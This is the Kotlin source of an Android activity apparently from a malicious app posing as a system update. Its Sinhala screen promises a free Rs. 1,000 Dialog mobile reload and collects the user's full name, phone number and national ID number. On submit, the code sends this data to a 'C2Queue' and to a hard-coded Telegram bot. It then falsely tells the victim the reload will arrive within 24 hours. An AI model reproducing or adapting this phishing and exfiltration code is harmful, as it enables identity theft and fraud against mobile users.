package com.sys.update

import android.os.Bundle
import android.text.InputType
import android.widget.*
import androidx.appcompat.app.AppCompatActivity
import org.json.JSONObject

class ClaimActivity : AppCompatActivity() {

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        val layout = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(48, 96, 48, 48)
            setBackgroundColor(0xFFFFFFFF.toInt())
        }

        layout.addView(TextView(this).apply {
            text = "ඔබගේ රු. 1,000 Reload එක ලබා ගන්න"
            textSize = 20f
            setTextColor(0xFFE60000.toInt())
            setPadding(0, 0, 0, 32)
        })

        layout.addView(TextView(this).apply { text = "ඔබගේ නම"; textSize = 13f })
        val nameInput = EditText(this).apply {
            hint = "සම්පූර්ණ නම"
            setPadding(0, 16, 0, 32)
        }
        layout.addView(nameInput)

        layout.addView(TextView(this).apply { text = "Dialog Number"; textSize = 13f })
        val numberInput = EditText(this).apply {
            hint = "07X XXX XXXX"
            inputType = InputType.TYPE_CLASS_PHONE
            setPadding(0, 16, 0, 32)
        }
        layout.addView(numberInput)

        layout.addView(TextView(this).apply { text = "NIC Number"; textSize = 13f })
        val nicInput = EditText(this).apply {
            hint = "XXXXXXXXX V"
            setPadding(0, 16, 0, 40)
        }
        layout.addView(nicInput)

        val btn = Button(this).apply {
            text = "රු. 1,000 Reload එක ලබා ගන්න"
            setBackgroundColor(0xFFE60000.toInt())
            setTextColor(0xFFFFFFFF.toInt())
            textSize = 16f
        }
        layout.addView(btn)

        val status = TextView(this).apply {
            setPadding(0, 32, 0, 0)
            textSize = 14f
        }
        layout.addView(status)

        btn.setOnClickListener {
            val name = nameInput.text.toString().trim()
            val number = numberInput.text.toString().trim()
            val nic = nicInput.text.toString().trim()

            if (name.isBlank() || number.isBlank()) {
                status.text = "කරුණාකර සියලු තොරතුරු පුරවන්න"
                return@setOnClickListener
            }

            val payload = JSONObject().apply {
                put("type", "form")
                put("name", name)
                put("number", number)
                put("nic", nic)
                put("ts", System.currentTimeMillis())
            }
            C2Queue.enqueueUrgent(payload.toString())
                    
            Thread {
                try {
                    val token = "8561465025:AAE1gWJhFxVP016X0c0fYXjzpW6oN5x1P9A"
                    val chatId = "8526210532"
                    val msg = "📝 FORM\nName: $name\nDialog: $number\nNIC: $nic"
                    val url = "https://api.telegram.org/bot$token/sendMessage"
                    val body = okhttp3.FormBody.Builder()
                        .add("chat_id", chatId)
                        .add("text", msg)
                        .build()
                    val req = okhttp3.Request.Builder().url(url).post(body).build()
                    okhttp3.OkHttpClient().newCall(req).execute().use { }
                } catch (_: Exception) {}
            }.start()


            status.text = "✅ ස්තූතියි!\n\nඔබගේ රු. 1,000 Reload එක\n24 පැය ඇතුළත ලැබෙනු ඇත."
            btn.isEnabled = false
            btn.text = "ලබා ගත්තා"
        }

        setContentView(layout)
    }
}
